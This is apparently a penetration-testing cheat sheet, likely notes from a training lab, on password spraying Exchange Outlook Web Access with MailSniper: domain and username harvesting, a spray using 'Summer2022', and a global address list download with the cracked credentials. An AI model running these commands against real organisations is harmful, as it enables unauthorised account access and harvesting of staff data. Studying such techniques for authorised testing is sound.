# Password Spraying

## MailSniper

https://github.com/dafthack/MailSniper

```powershell
# Import MailSniper module
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Enumerate the NetBIOS name of the target domain
Invoke-DomainHarvestOWA -ExchHostname mail.$domain
```

## Find Valid Usernames

### namemash.py

https://gist.github.com/superkojiman/11076951

```bash
# Use namemash.py on the names.txt which was found during external enumeration.
namemash.py names.txt > possible.txt
```

### MailSniper

{% code overflow="wrap" %}
```powershell
# Use MailSniper to validate email addresses. 
Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
# Use MailSniper to spray a password against valid addresses. 
Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
# If you have valid credentials download the global address list. 
Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt

```
{% endcode %}
